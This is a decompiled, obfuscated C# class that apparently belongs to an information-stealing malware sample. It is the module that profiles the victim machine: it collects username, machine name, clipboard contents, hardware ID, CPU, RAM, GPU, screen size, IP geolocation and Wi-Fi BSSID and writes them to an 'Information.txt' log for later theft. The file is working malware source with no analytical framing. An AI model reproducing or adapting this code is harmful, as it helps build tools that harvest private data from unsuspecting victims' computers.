using System;
using System.Drawing;
using System.IO;
using System.Management;
using System.Windows.Forms;
using Microsoft.Win32;

internal class Class41
{
	public static string string_0 = Environment.UserName;

	public static string string_1 = Environment.MachineName;

	public static void smethod_0()
	{
		string string_ = Class38.string_11;
		string contents = " ==================================================\n Operating system: " + smethod_1() + "\n PC user: " + string_1 + "/" + string_0 + "\n ClipBoard: " + Class35.smethod_0() + "\n Launch: " + Class38.string_7 + "\n ==================================================\n Screen resolution: " + smethod_7() + "\n Current time: " + DateTime.Now.ToString() + "\n HWID: " + smethod_10() + "\n ==================================================\n CPU: " + smethod_8() + "\n RAM: " + smethod_9() + "\n GPU: " + smethod_11() + "\n ==================================================\n IP Geolocation: " + smethod_6() + " " + smethod_5() + "\n Log Date: " + Class38.string_12 + "\n BSSID: " + Class34.smethod_0() + "\n ==================================================";
		File.WriteAllText(string_ + "\\Information.txt", contents);
	}

	public static string smethod_1()
	{
		return smethod_2() + " " + smethod_3();
	}

	public static string smethod_2()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002b: Unknown result type (might be due to invalid IL or missing references)
		string text = "Unknown System";
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("root\\CIMV2", " SELECT * FROM win32_operatingsystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						text = Convert.ToString(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name"));
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				text = text.Split(new char[1] { '|' })[0];
				int length = text.Split(new char[1] { ' ' })[0].Length;
				text = text.Substring(length).TrimStart(new char[0]).TrimEnd(new char[0]);
				return text;
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return text;
		}
	}

	private static string smethod_3()
	{
		try
		{
			if (Registry.LocalMachine.OpenSubKey("HARDWARE\\Description\\System\\CentralProcessor\\0")!.GetValue("Identifier")!.ToString()!.Contains("x86"))
			{
				return "(32 Bit)";
			}
			return "(64 Bit)";
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return "(Unknown)";
	}

	public static string smethod_4()
	{
		if (Class38.bool_0)
		{
			return "[" + Class38.xmlDocument_0.GetElementsByTagName("CountryCode")[0]!.InnerText + "]";
		}
		return "Fail";
	}

	public static string smethod_5()
	{
		if (Class38.bool_0)
		{
			return "[" + Class38.xmlDocument_0.GetElementsByTagName("CountryName")[0]!.InnerText + "]";
		}
		return "Fail";
	}

	public static string smethod_6()
	{
		if (Class38.bool_0)
		{
			return Class38.xmlDocument_0.GetElementsByTagName("IP")[0]!.InnerText;
		}
		return "Fail";
	}

	public static string smethod_7()
	{
		Rectangle bounds = Screen.GetBounds(Point.Empty);
		int width = bounds.Width;
		return string.Concat(str2: bounds.Height.ToString(), str0: width.ToString(), str1: "x");
	}

	public static string smethod_8()
	{
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string result = string.Empty;
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_Processor").Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					result = ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return result;
		}
		catch (Exception ex)
		{
			Console.WriteLine(ex?.ToString() + "СистемИнфа");
			return "Error";
		}
	}

	public static string smethod_9()
	{
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			int num = 0;
			ManagementObjectSearcher val = new ManagementObjectSearcher("Select * From Win32_ComputerSystem");
			try
			{
				ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
				try
				{
					if (enumerator.MoveNext())
					{
						num = (int)(Convert.ToDouble(((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("TotalPhysicalMemory")) / 1048576.0) - 1;
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val)?.Dispose();
			}
			return num + "MB";
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
			return "Error";
		}
	}

	public static string smethod_10()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0024: Unknown result type (might be due to invalid IL or missing references)
		string result = string.Empty;
		ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("SELECT ProcessorId FROM Win32_Processor").Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				result = (string)((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("ProcessorId");
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}

	public static string smethod_11()
	{
		//IL_000a: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			ManagementObjectEnumerator enumerator = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_VideoController").Get().GetEnumerator();
			try
			{
				if (enumerator.MoveNext())
				{
					return ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("Name").ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return "Unknown";
	}
}
